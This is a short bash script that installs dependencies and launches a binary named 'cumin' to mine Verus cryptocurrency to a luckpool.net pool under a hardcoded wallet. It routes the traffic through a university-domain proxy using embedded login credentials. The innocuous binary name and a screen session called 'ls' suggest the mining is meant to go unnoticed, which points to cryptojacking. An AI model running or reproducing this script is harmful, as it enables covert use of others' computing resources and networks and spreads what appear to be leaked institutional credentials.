#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://ap.luckpool.net:3956
WALLET=RTxdgLSqxiTVkUKegd5L5S3e8pJrAkK621
WORKER=$(echo $(shuf -i 1-1 -n 1)-SHE)
PROXY=http://ITS-563181-6277a:09ed7@proxy.its.ac.id:8080
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
